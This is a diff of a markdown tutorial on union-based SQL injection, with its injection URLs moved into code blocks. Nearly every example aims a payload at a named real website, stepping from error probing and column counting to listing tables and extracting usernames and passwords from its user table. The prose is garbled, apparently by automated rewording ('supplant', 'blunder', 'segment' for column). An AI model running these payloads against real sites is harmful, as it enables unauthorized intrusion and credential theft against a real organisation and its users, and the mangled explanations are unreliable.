@@ -124,7 +124,9 @@ Presently we should take a look at the weakness of sites. To look at the fault, 
 
 Example:-
 
-> http://www.pha.org.pk/sro_list.php?catid=1'
+```
+http://www.pha.org.pk/sro_list.php?catid=1'
+```
 
 ![enter image description here](https://i.postimg.cc/7hNkF34G/1-step.png)
 
@@ -141,10 +143,12 @@ For that, supplant the single statements(') with "request by a" statement. (leav
 Change from 1,2,3,4, 5,6,… n. Until you get the blunder like "obscure columns. "
 Example:
 
-> http://www.pha.org.pk/sro_list.php?catid=1 order by 1  
-> http://www.pha.org.pk/sro_list.php?catid=1 order by 2  
-> http://www.pha.org.pk/sro_list.php?catid=1 order by 3  
-> http://www.pha.org.pk/sro_list.php?catid=1 order by 4
+```
+http://www.pha.org.pk/sro_list.php?catid=1 order by 1  
+http://www.pha.org.pk/sro_list.php?catid=1 order by 2  
+http://www.pha.org.pk/sro_list.php?catid=1 order by 3  
+http://www.pha.org.pk/sro_list.php?catid=1 order by 4
+```
 
 ![enter image description here](https://i.postimg.cc/rwskHRPs/step-2.png)
 
@@ -154,7 +158,8 @@ Assuming you get the blunder while attempting the "x"th number, no of the segmen
 
 Ex.
 
-` http://www.pha.org.pk/sro_list.php?catid=1 order by 1--(no error)
+```
+http://www.pha.org.pk/sro_list.php?catid=1 order by 1--(no error)
 
 http://www.pha.org.pk/sro_list.php?catid=1 order by 2--(no error)
 
@@ -164,7 +169,8 @@ http://www.pha.org.pk/sro_list.php?catid=1 order by 4--(no error)
 
 http://www.pha.org.pk/sro_list.php?catid=1 order by 5--(no error)
 
-http://www.pha.org.pk/sro_list.php?catid=1 order by 6--(error)`
+http://www.pha.org.pk/sro_list.php?catid=1 order by 6--(error)
+```
 
 so presently x=6 , The quantity of segment is x-1 i.e, 5.
 
@@ -180,7 +186,9 @@ Supplant the columns_sequence with the no from 1 to x-1(number of sections) isol
 
 on the off chance that the quantity of segments is 5 ,the query is as follow:-
 
-`http://www.pha.org.pk/sro_list.php?catid=-1 +UNION+ALL+SELECT+1,2,3,4,5--+---`
+```
+http://www.pha.org.pk/sro_list.php?catid=-1 +UNION+ALL+SELECT+1,2,3,4,5--+---
+```
 
 It will show a few numbers in the page(it should be not exactly 'x' esteem, I mean not exactly or equl to number of sections).
 
@@ -195,7 +203,9 @@ Presently we need to track down the table name of the information base. Supplant
 
 Ex.
 
-`http://www.pha.org.pk/sro_list.php?catid=-1 +UNION+ALL+SELECT+1,2,group_concat(table_name,0x3c6c693e),4,5 from information_schema.tables where table_schema=database()--+-`
+```
+http://www.pha.org.pk/sro_list.php?catid=-1 +UNION+ALL+SELECT+1,2,group_concat(table_name,0x3c6c693e),4,5 from information_schema.tables where table_schema=database()--+-
+```
 
 0x3c6c693e this one use to list
 
@@ -221,7 +231,9 @@ Reorder the code toward the finish of the url rather than the "mysqlchar"
 
 Ex.
 
-> http://www.pha.org.pk/sro_list.php?catid=-1 +UNION+ALL+SELECT+1,2,group_concat(column_name,0x3c6c693e),4,5 from information_schema.columns where table_name=CHAR(99, 112, 95, 117, 115, 101, 114)--+-
+```
+ http://www.pha.org.pk/sro_list.php?catid=-1 +UNION+ALL+SELECT+1,2,group_concat(column_name,0x3c6c693e),4,5 from information_schema.columns where table_name=CHAR(99, 112, 95, 117, 115, 101, 114)--+-
+```
 
 ![### (img 6)](https://i.postimg.cc/43tN8hYt/step-6.png)
 
@@ -235,17 +247,23 @@ like -
 - u_type
 - is_active ..
 
+```
 Presently supplant the supplant group_concat(column_name) with group_concat(columnname,0x3c6c693e,another column name).
+```
 
 Column name ought to be supplanted from the recorded segment name.
 
 Another column name ought to be supplanted from the recorded segment name.
 
+```
 Presently supplant the " from information_schema.columns where table_name=CHAR(99, 112, 95, 117, 115, 101, 114)" with the "from table_name"
+```
 
 Ex:
 
-> `http://www.pha.org.pk/sro_list.php?catid=-1 +UNION+ALL+SELECT+1,2,group_concat(u_id,0x3c6c693e,u_pass),4,5 from cp_user--+-`
+```
+http://www.pha.org.pk/sro_list.php?catid=-1 +UNION+ALL+SELECT+1,2,group_concat(u_id,0x3c6c693e,u_pass),4,5 from cp_user--+-
+```
 
 ![enter image description here](https://i.postimg.cc/9f1NHLwj/7.png)
 
@@ -253,3 +271,5 @@ At some point, it will show the section isn't found.
 Then, at that point, attempt another section names
 Presently it will have a Username and passwords.
 Appreciate
+
+### Thanks for reading
